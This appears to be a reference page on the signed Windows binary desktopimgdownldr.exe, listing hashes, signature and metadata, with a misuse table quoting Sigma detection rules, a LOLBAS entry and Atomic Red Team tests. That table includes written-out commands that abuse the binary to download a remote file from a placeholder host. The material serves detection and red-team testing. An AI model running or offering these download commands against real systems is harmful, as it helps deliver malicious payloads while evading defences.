---
title: desktopimgdownldr.exe | desktopimgdownldr.exe
excerpt: What is desktopimgdownldr.exe?
---

# desktopimgdownldr.exe 

* File Path: `C:\WINDOWS\system32\desktopimgdownldr.exe`
* Description: desktopimgdownldr.exe

## Hashes

Type | Hash
-- | --
MD5 | `4310F04E81E3BBBF0C2D6231CE4C9CF9`
SHA1 | `71BCF5B4319CFA8803588D7921E62CB2C11C69A3`
SHA256 | `8ABDB26264FEA2529FE91D355128E283B93A66144C76FF96E1C1F9CDDFFC75A7`
SHA384 | `8F3DEAD5DB40B76E8D3ABD060E9E65A6743970A8E54AD5A3911A07473DD460ED4AAE306B16B89398F958AB190BA50623`
SHA512 | `906C1199CAE0B8C285C8ECF71668DD3DAEB543F6741A6806933BAB0307411A2C57C39153C228DFCF25551B4220D0A9F835CCF067245E5479E3A1454C4255B40F`
SSDEEP | `1536:xce799kpRpw3Aylus6NxvFLlwp9X4ULFPlMNR4pknAfZYl+00NIcAXQcO3U:TApeAPs6Nx1lwphhCaCCE0NIcAAcO`
IMP | `37D6DC6AADFD1E05E947C537F5829588`
PESHA1 | `43265EC4001355547B1C4F5AFA9A568E75DFB40A`
PE256 | `A086063ACA0BA550D8A7E229830FE518233BC79747ED40D66BB83B53968C1717`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\WINDOWS\system32\desktopimgdownldr.exe |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: desktopimgdownldr.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.22000.1 (WinBuild.160101.0800)
* Product Version: 10.0.22000.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/8abdb26264fea2529fe91d355128e283b93a66144c76ff96e1c1f9cddffc75a7/detection


## Possible Misuse

*The following table contains possible examples of `desktopimgdownldr.exe` being misused. While `desktopimgdownldr.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `title: Suspicious Desktopimgdownldr Target File`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_copy_system32.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_copy_system32.yml) | `description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `title: Suspicious Desktopimgdownldr Command`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `Name: Desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Path: c:\windows\system32\desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- IOC: desktopimgdownldr.exe that creates non-image file`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | - [Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)](#atomic-test-4---bits-download-using-desktopimgdownldrexe-cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | ## Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | This test simulates using desktopimgdownldr.exe to download a malicious file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


